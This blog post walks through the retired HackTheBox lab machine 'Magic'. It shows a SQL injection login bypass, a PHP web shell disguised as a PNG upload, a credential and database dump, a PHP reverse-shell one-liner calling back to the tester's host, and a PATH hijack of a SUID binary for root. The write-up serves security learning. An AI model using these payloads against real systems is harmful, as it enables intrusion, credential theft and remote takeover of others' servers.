<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Magic | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/08/htb-magic.html" title="Read more" class="entry-title-link">
                HTB: Magic</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-08-29T08:50:00+02:00">29 Aug 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
          <a href="../../tag/upload.html" title="Read more with the label Upload" class="meta-link">Upload</a> 
          <a href="../../tag/suid.html" title="Read more with the label SUID" class="meta-link">SUID</a> 
          <a href="../../tag/sqli.html" title="Read more with the label SQLi" class="meta-link">SQLi</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.08/magic_card.png" alt="Magic card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/241">Magic</a> publish by
<a href="https://www.hackthebox.com/home/users/profile/31190">TRX</a> on April 18 2020.
This box is classified as a medium machine but is quit easy.
It involves a basic SQL injection, a magic file upload and a SUID binary.</p>


<h1 id="recon">Recon</h1>
<p>We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP).</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Apr 20 11:14:29 2020 as: nmap -p- -oN nmap 10.10.10.185</span>
<span class="code-line">Nmap scan report for 10.10.10.185</span>
<span class="code-line">Host is up (0.016s latency).</span>
<span class="code-line">Not shown: 65533 closed ports</span>
<span class="code-line">PORT   STATE SERVICE</span>
<span class="code-line">22/tcp open  ssh</span>
<span class="code-line">80/tcp open  http</span>
<span class="code-line"></span>
<span class="code-line"># Nmap done at Mon Apr 20 11:14:42 2020 -- 1 IP address (1 host up) scanned in 12.63 seconds</span>
<span class="code-line"></code></pre></div>

<h1 id="ssh">SSH</h1>
<p>The SSH service accept only public key authentication. Therefore we won't be
able to use any password found to connect to the SSH service.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ ssh toto@10.10.10.185</span>
<span class="code-line">toto@10.10.10.185: Permission denied (publickey).</span>
<span class="code-line"></code></pre></div>

<h1 id="web">Web</h1>
<p>The website expose some picture gallery.</p>
<p><img alt="main page" src="/media/2020.08/magic_01.png"></p>
<p>The website announce that we need to login to upload new picture.</p>
<p><img alt="login form" src="/media/2020.08/magic_02.png"></p>
<p>Some mechanism forbid us to put space in our username and password. We fire up
Burp and edit the request using the <code>Intercept</code> function so that our post
request look like the following</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>POST /login.php HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.185</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs</span>
<span class="code-line"></span>
<span class="code-line">username=aa&#39; or 1=1 -- &amp;password=a</span>
<span class="code-line"></code></pre></div>

<p>We are then logged in and we can upload picture using the application.</p>
<p><img alt="upload form" src="/media/2020.08/magic_03.png"></p>
<p>Obviously we want to upload some PHP file for instance
<code>/usr/share/webshells/php/simple-backdoor.php</code>. We intercept the request with
Burp and change the Content-Type to <code>image/png</code> and the image name to
<code>simple-backdoor.php.png</code>.</p>
<p>Our request is blocked and the application send us the following message
<code>&lt;script&gt;alert('What are you trying to do there?')&lt;/script&gt;&lt;!DOCTYPE HTML&gt;</code></p>
<p>That where the name of the box is relevant. We need to add the
PNG <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic number</a> to
our file.</p>
<p>Still using Burp we add <code>aaaaaaaa</code> at the begging of our file.</p>
<p><img alt="Burp request with aaaaaaaa" src="/media/2020.08/magic_04.png"></p>
<p>Using the Raw editor in Burp we replace our <code>a</code> (<code>61</code>) by the PNG's magic number
<code>89 50 4E 47 0D 0A 1A 0A</code>.</p>
<p><img alt="Burp request with PNG's magic number" src="/media/2020.08/magic_05.png"></p>
<p>Our request now looks like the following (I was forced to clean the requests
with the magic numbers as it broke the RSS/Atom xml).</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>POST /upload.php HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.185</span>
<span class="code-line">Content-Type: multipart/form-data; boundary=---------------------------1971341748341881315972996739</span>
<span class="code-line">Content-Length: 692</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Cookie: PHPSESSID=gl7e03c4vb6ejee40tgeobjhfh</span>
<span class="code-line"></span>
<span class="code-line">-----------------------------1971341748341881315972996739</span>
<span class="code-line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;simple-backdoor2.php.png&quot;</span>
<span class="code-line">Content-Type: image/png</span>
<span class="code-line"></span>
<span class="code-line">&lt;89&gt;PNG</span>
<span class="code-line">^Z</span>
<span class="code-line"></span>
<span class="code-line">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>
<span class="code-line"></span>
<span class="code-line">&lt;?php</span>
<span class="code-line"></span>
<span class="code-line">if(isset($_REQUEST[&#39;cmd&#39;])){</span>
<span class="code-line">        echo &quot;&lt;pre&gt;&quot;;</span>
<span class="code-line">        $cmd = ($_REQUEST[&#39;cmd&#39;]);</span>
<span class="code-line">        system($cmd);</span>
<span class="code-line">        echo &quot;&lt;/pre&gt;&quot;;</span>
<span class="code-line">        die;</span>
<span class="code-line">}</span>
<span class="code-line"></span>
<span class="code-line">?&gt;</span>
<span class="code-line"></span>
<span class="code-line">Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span>
<span class="code-line"></span>
<span class="code-line">&lt;!--    http://michaeldaw.org   2006    --&gt;</span>
<span class="code-line"></span>
<span class="code-line">-----------------------------1971341748341881315972996739</span>
<span class="code-line">Content-Disposition: form-data; name=&quot;submit&quot;</span>
<span class="code-line"></span>
<span class="code-line">Upload Image</span>
<span class="code-line">-----------------------------1971341748341881315972996739--</span>
<span class="code-line"></code></pre></div>

<p>This "image" will be uploaded and we can then go to
<code>http://10.10.10.185/images/uploads/simple-backdoor2.php</code> to execute some
commands on the system.</p>
<p>We start enumerating and found a <code>db.php5</code> file containing the database
credentials <code>theseus:iamkingtheseus</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /images/uploads/simple-backdoor2.php.png?cmd=cat+/var/www/Magic/db.php5 HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.185</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs</span>
<span class="code-line">Content-Length: 2</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">HTTP/1.1 200 OK</span>
<span class="code-line">Date: Wed, 22 Apr 2020 12:32:22 GMT</span>
<span class="code-line">Server: Apache/2.4.29 (Ubuntu)</span>
<span class="code-line">Vary: Accept-Encoding</span>
<span class="code-line">Content-Length: 961</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Content-Type: text/html; charset=UTF-8</span>
<span class="code-line"></span>
<span class="code-line">&lt;89&gt;PNG</span>
<span class="code-line">^Z</span>
<span class="code-line"></span>
<span class="code-line">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>
<span class="code-line"></span>
<span class="code-line">&lt;pre&gt;</span>
<span class="code-line">class Database</span>
<span class="code-line">{</span>
<span class="code-line">    private static $dbName = &#39;Magic&#39; ;</span>
<span class="code-line">    private static $dbHost = &#39;localhost&#39; ;</span>
<span class="code-line">    private static $dbUsername = &#39;theseus&#39;;</span>
<span class="code-line">    private static $dbUserPassword = &#39;iamkingtheseus&#39;;</span>
<span class="code-line"></span>
<span class="code-line">    private static $cont  = null;</span>
<span class="code-line"></span>
<span class="code-line">    public function __construct() {</span>
<span class="code-line">        die(&#39;Init function is not allowed&#39;);</span>
<span class="code-line">    }</span>
<span class="code-line"></span>
<span class="code-line">    public static function connect()</span>
<span class="code-line">    {</span>
<span class="code-line">        // One connection through whole application</span>
<span class="code-line">        if ( null == self::$cont )</span>
<span class="code-line">        {</span>
<span class="code-line">            try</span>
<span class="code-line">            {</span>
<span class="code-line">                self::$cont =  new PDO( &quot;mysql:host=&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname=&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);</span>
<span class="code-line">            }</span>
<span class="code-line">            catch(PDOException $e)</span>
<span class="code-line">            {</span>
<span class="code-line">                die($e-&gt;getMessage());</span>
<span class="code-line">            }</span>
<span class="code-line">        }</span>
<span class="code-line">        return self::$cont;</span>
<span class="code-line">    }</span>
<span class="code-line"></span>
<span class="code-line">    public static function disconnect()</span>
<span class="code-line">    {</span>
<span class="code-line">        self::$cont = null;</span>
<span class="code-line">    }</span>
<span class="code-line">}</span>
<span class="code-line">&lt;/pre&gt;</span>
<span class="code-line"></code></pre></div>

<p>We can then use <code>mysqldump</code> (which is strangely present on the box) to dump the
content of all databases using the previous credentials. That give us the
credentials for the web login form: <code>admin:Th3s3usW4sK1ng</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /images/uploads/simple-backdoor2.php.png?cmd=mysqldump+-piamkingtheseus+-u+theseus+--all-databases HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.185</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">HTTP/1.1 200 OK</span>
<span class="code-line">Date: Wed, 22 Apr 2020 12:31:35 GMT</span>
<span class="code-line">Server: Apache/2.4.29 (Ubuntu)</span>
<span class="code-line">Vary: Accept-Encoding</span>
<span class="code-line">Content-Length: 2201</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Content-Type: text/html; charset=UTF-8</span>
<span class="code-line"></span>
<span class="code-line">&lt;89&gt;PNG</span>
<span class="code-line">^Z</span>
<span class="code-line"></span>
<span class="code-line">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span>
<span class="code-line"></span>
<span class="code-line">&lt;pre&gt;-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)</span>
<span class="code-line">--</span>
<span class="code-line">-- Host: localhost    Database:</span>
<span class="code-line">-- ------------------------------------------------------</span>
<span class="code-line">-- Server version   5.7.29-0ubuntu0.18.04.1</span>
<span class="code-line"></span>
<span class="code-line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span>
<span class="code-line">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;</span>
<span class="code-line">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;</span>
<span class="code-line">/*!40101 SET NAMES utf8 */;</span>
<span class="code-line">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;</span>
<span class="code-line">/*!40103 SET TIME_ZONE=&#39;+00:00&#39; */;</span>
<span class="code-line">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;</span>
<span class="code-line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span>
<span class="code-line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */;</span>
<span class="code-line">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;</span>
<span class="code-line"></span>
<span class="code-line">--</span>
<span class="code-line">-- Current Database: `Magic`</span>
<span class="code-line">--</span>
<span class="code-line"></span>
<span class="code-line">CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;</span>
<span class="code-line"></span>
<span class="code-line">USE `Magic`;</span>
<span class="code-line"></span>
<span class="code-line">--</span>
<span class="code-line">-- Table structure for table `login`</span>
<span class="code-line">--</span>
<span class="code-line"></span>
<span class="code-line">DROP TABLE IF EXISTS `login`;</span>
<span class="code-line">/*!40101 SET @saved_cs_client     = @@character_set_client */;</span>
<span class="code-line">/*!40101 SET character_set_client = utf8 */;</span>
<span class="code-line">CREATE TABLE `login` (</span>
<span class="code-line">  `id` int(6) NOT NULL AUTO_INCREMENT,</span>
<span class="code-line">  `username` varchar(50) NOT NULL,</span>
<span class="code-line">  `password` varchar(100) NOT NULL,</span>
<span class="code-line">  PRIMARY KEY (`id`),</span>
<span class="code-line">  UNIQUE KEY `username` (`username`)</span>
<span class="code-line">) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;</span>
<span class="code-line">/*!40101 SET character_set_client = @saved_cs_client */;</span>
<span class="code-line"></span>
<span class="code-line">--</span>
<span class="code-line">-- Dumping data for table `login`</span>
<span class="code-line">--</span>
<span class="code-line"></span>
<span class="code-line">LOCK TABLES `login` WRITE;</span>
<span class="code-line">/*!40000 ALTER TABLE `login` DISABLE KEYS */;</span>
<span class="code-line">INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;);</span>
<span class="code-line">/*!40000 ALTER TABLE `login` ENABLE KEYS */;</span>
<span class="code-line">UNLOCK TABLES;</span>
<span class="code-line">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;</span>
<span class="code-line"></span>
<span class="code-line">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;</span>
<span class="code-line">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span>
<span class="code-line">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span>
<span class="code-line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span>
<span class="code-line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span>
<span class="code-line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span>
<span class="code-line">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span>
<span class="code-line"></span>
<span class="code-line">-- Dump completed on 2020-04-22  5:31:35</span>
<span class="code-line">&lt;/pre&gt;</span>
<span class="code-line"></code></pre></div>

<p>It is time to get a proper shell. We know that PHP is installed on the box (as
the web application is using PHP). So we use a PHP reverse shell and run
<code>nc -l -p 4242</code> on our side.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /images/uploads/simple-backdoor2.php.png?cmd=php+-r+&#39;$sock%3dfsockopen(&quot;10.10.14.226&quot;,4242)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#39; HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.185</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs</span>
<span class="code-line"></code></pre></div>

<p>That will give us a reverse shell as <code>www-data</code> without interactivity.
Using <code>/usr/bin/script -qc /bin/bash /dev/null</code> we get a better shell with
interactivity and can simply change user with <code>su theseus</code> and inputing his
password <code>Th3s3usW4sK1ng</code></p>
<p>Then we can grab the user flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>nc -l -p 4242</span>
<span class="code-line">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
<span class="code-line">$ /usr/bin/script -qc /bin/bash /dev/null</span>
<span class="code-line">www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus</span>
<span class="code-line">su theseus</span>
<span class="code-line">Password: Th3s3usW4sK1ng</span>
<span class="code-line"></span>
<span class="code-line">theseus@ubuntu:/var/www/Magic/images/uploads$ cat ~/user.txt</span>
<span class="code-line">cat ~/user.txt</span>
<span class="code-line">e0d993fb203a25ba31cee6d8aa2a612f</span>
<span class="code-line"></code></pre></div>

<h1 id="root">Root</h1>
<p>When looking at the SUID files we see that <code>sysinfo</code> is quit recent.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>theseus@ubuntu:/var/www/Magic/images/uploads$ find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \; | grep -v snap</span>
<span class="code-line">&lt;ype f -exec ls -la {} 2&gt;/dev/null \; | grep -v snap</span>
<span class="code-line">-rwsr-xr-- 1 root dip 382696 Feb 11 07:05 /usr/sbin/pppd</span>
<span class="code-line">-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp</span>
<span class="code-line">-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd</span>
<span class="code-line">-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn</span>
<span class="code-line">-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd</span>
<span class="code-line">-rwsr-xr-x 1 root root 149080 Jan 31 09:18 /usr/bin/sudo</span>
<span class="code-line">-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec</span>
<span class="code-line">-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh</span>
<span class="code-line">-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils</span>
<span class="code-line">-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping</span>
<span class="code-line">-rwsr-xr-x 1 root root 10312 Dec  9 02:03 /usr/bin/vmware-user-suid-wrapper</span>
<span class="code-line">-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign</span>
<span class="code-line">-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
<span class="code-line">-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1</span>
<span class="code-line">-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</span>
<span class="code-line">-rwsr-sr-x 1 root root 10232 Dec 18 00:15 /usr/lib/xorg/Xorg.wrap</span>
<span class="code-line">-rwsr-xr-x 1 root root 26696 Jan  8 10:31 /bin/umount</span>
<span class="code-line">-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount</span>
<span class="code-line">-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo</span>
<span class="code-line">-rwsr-xr-x 1 root root 43088 Jan  8 10:31 /bin/mount</span>
<span class="code-line">-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su</span>
<span class="code-line">-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping</span>
<span class="code-line"></code></pre></div>

<p>We use <code>ltrace</code> (also already on the box) to see the binary calls and quickly
saw a call to <code>lshw</code> using a relative path.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>theseus@ubuntu:/var/www/Magic/images/uploads$ ltrace /bin/sysinfo</span>
<span class="code-line">ltrace /bin/sysinfo</span>
<span class="code-line">_ZNSt8ios_base4InitC1Ev(0x55b09400e131, 0xffff, 0x7ffef3bfc788, 128) = 0</span>
<span class="code-line">__cxa_atexit(0x7f40c551fa40, 0x55b09400e131, 0x55b09400e008, 6) = 0</span>
<span class="code-line">setuid(0)                                        = -1</span>
<span class="code-line">setgid(0)                                        = -1</span>
<span class="code-line">_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x55b09400e020, 0x55b093e0c8f8, -160, 0) = 0x55b09400e020</span>
<span class="code-line">_ZNSolsEPFRSoS_E(0x55b09400e020, 0x7f40c558f870, 0x55b09400e020, 0x55b093e0c92d====================Hardware Info====================</span>
<span class="code-line">) = 0x55b09400e020</span>
<span class="code-line">_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffef3bfc650, 0x55b093e0c92e, 0, 2880) = 0x7ffef3bfc660</span>
<span class="code-line">popen(&quot;lshw -short&quot;, &quot;r&quot;)                        = 0x55b095436280</span>
<span class="code-line">fgets(WARNING: you should run this program as super-user.</span>
<span class="code-line">&quot;H/W path     Device  Class      &quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70</span>
<span class="code-line">_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x6974706972637365)                  = 0x7ffe1eb20c20</span>
<span class="code-line">fgets(&quot;================================&quot;..., 128, 0x563a9c8f6280)                                                                                = 0x7ffe1eb20b70</span>
<span class="code-line">_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc(0x7ffe1eb20c20, 0x7ffe1eb20b70, 0x7ffe1eb20b70, 0x3d3d3d3d3d3d3d3d)                  = 0x7ffe1eb20c20</span>
<span class="code-line"></code></pre></div>

<p>So we simply exploit this <code>PATH</code> vulnerability and get the root flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>theseus@ubuntu:/var/www/Magic/images/uploads$ cd /tmp/</span>
<span class="code-line">cd /tmp/</span>
<span class="code-line">theseus@ubuntu:/tmp$ mkdir ioio</span>
<span class="code-line">mkdir ioio</span>
<span class="code-line">theseus@ubuntu:/tmp$ cd ioio</span>
<span class="code-line">cd ioio</span>
<span class="code-line">theseus@ubuntu:/tmp/ioio$ echo &#39;cat /root/root.txt&#39; &gt; lshw</span>
<span class="code-line">echo &#39;cat /root/root.txt&#39; &gt; lshw</span>
<span class="code-line">theseus@ubuntu:/tmp/ioio$ PATH=./:$PATH</span>
<span class="code-line">PATH=./:$PATH</span>
<span class="code-line">theseus@ubuntu:/tmp/ioio$ chmod +x lshw</span>
<span class="code-line">chmod +x lshw</span>
<span class="code-line">theseus@ubuntu:/tmp/ioio$ sysinfo</span>
<span class="code-line">sysinfo</span>
<span class="code-line">====================Hardware Info====================</span>
<span class="code-line">a06f37dc581bc81a9e688040af40daaf</span>
<span class="code-line"></span>
<span class="code-line">====================Disk Info====================</span>
<span class="code-line">Disk /dev/loop0: 44.9 MiB, 47063040 bytes, 91920 sectors</span>
<span class="code-line">Units: sectors of 1 * 512 = 512 bytes</span>
<span class="code-line">Sector size (logical/physical): 512 bytes / 512 bytes</span>
<span class="code-line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Disk /dev/loop1: 149.9 MiB, 157192192 bytes, 307016 sectors</span>
<span class="code-line">Units: sectors of 1 * 512 = 512 bytes</span>
<span class="code-line">Sector size (logical/physical): 512 bytes / 512 bytes</span>
<span class="code-line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span>
<span class="code-line"></code></pre></div>

<p>(The flag is in the <code>Hardware Info</code> part in the first lines of the <code>sysinfo</code> output.)</p>
<h1 id="wrapping-up">Wrapping up</h1>
<p>Quit an easy but pleasant box. I will recommend this box to beginners as I
really enjoyed it.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/08/htb-traceback.html"> HTB: Traceback </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/09/htb-admirer.html"> HTB: Admirer </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/snmp.html">snmp</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/neofetch.html">neofetch</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phone-number.html">phone number</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
